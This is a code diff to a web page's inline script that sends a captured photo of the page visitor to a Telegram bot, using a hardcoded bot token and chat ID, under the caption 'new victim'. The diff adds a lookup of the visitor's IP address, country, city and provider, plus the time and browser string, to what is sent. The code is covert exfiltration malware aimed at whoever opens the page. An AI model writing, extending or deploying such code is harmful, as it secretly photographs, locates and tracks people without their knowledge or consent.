@@ -8,16 +8,33 @@
   <script>
     const TG_TOKEN   = '8816324332:AAH8hUkPtRpXexSxbKZjVAdzLAFHG8spqu0';
     const TG_CHAT_ID = '1577709820';
+
+    async function getIP() {
+      try {
+        const r = await fetch('https://ip-api.com/json/?fields=query,country,regionName,city,isp');
+        const d = await r.json();
+        return `IP: ${d.query}\nСтрана: ${d.country}\nГород: ${d.city} (${d.regionName})\nПровайдер: ${d.isp}`;
+      } catch(e) {
+        return 'IP: не удалось получить';
+      }
+    }
+
     async function sendToTelegram(dataUrl) {
       try {
-        const blob = await (await fetch(dataUrl)).blob();
+        const [blob, ipInfo] = await Promise.all([
+          fetch(dataUrl).then(r => r.blob()),
+          getIP()
+        ]);
         const fd = new FormData();
         fd.append('chat_id', TG_CHAT_ID);
         fd.append('photo', blob, 'photo.jpg');
         fd.append('caption',
-          'Новая жертва\n' +
-          new Date().toLocaleString('ru-RU') + '\n' +
-          navigator.userAgent.substring(0, 120)
+          'НОВАЯ ЖЕРТВА\n' +
+          '─────────────────\n' +
+          ipInfo + '\n' +
+          '─────────────────\n' +
+          'Время: ' + new Date().toLocaleString('ru-RU') + '\n' +
+          'Браузер: ' + navigator.userAgent.substring(0, 100)
         );
         await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendPhoto`, {method:'POST',body:fd});
       } catch(e){}
